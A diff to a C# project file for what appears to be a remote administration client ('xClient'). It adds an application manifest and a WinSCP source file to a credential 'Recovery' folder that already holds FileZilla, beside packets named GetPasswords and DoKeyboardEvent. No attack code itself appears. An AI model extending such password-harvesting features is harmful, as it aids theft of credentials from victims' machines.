@@ -38,6 +38,9 @@
   <PropertyGroup>
     <StartupObject>xClient.Program</StartupObject>
   </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
@@ -83,6 +86,7 @@
     <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
+    <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
@@ -211,6 +215,7 @@
       <DependentUpon>Resources.resx</DependentUpon>
       <DesignTime>True</DesignTime>
     </Compile>
+    <None Include="app.manifest" />
     <None Include="Properties\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
       <LastGenOutput>Settings.Designer.cs</LastGenOutput>
